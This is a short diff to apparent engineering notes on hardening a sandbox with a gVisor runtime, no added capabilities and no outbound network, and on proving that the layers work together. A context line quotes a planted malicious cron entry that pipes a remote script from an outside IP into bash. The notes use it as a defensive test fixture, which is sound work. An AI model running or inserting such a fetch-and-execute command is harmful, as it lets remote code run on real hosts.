@@ -2705,3 +2705,9 @@ Confirmed incidentally by that run: the planted malicious cron
 (`curl http://198.51.100.23/x.sh | bash`) can no longer reach out, and the
 checks still score the same — so they grade the cron line's *presence*
 rather than its success, which is what a sandbox should do.
+**Finally, the layers were proven together, not just separately:**
+`RZ_RUNTIME=runsc RZ_NETWORK=<internal> bash agent/scripts/prove.sh` is green
+across all four states and the trap demo. That combination — gVisor runtime,
+zero added capabilities, no route off the host — is the production
+configuration, and proving each layer alone would not have shown they
+compose.
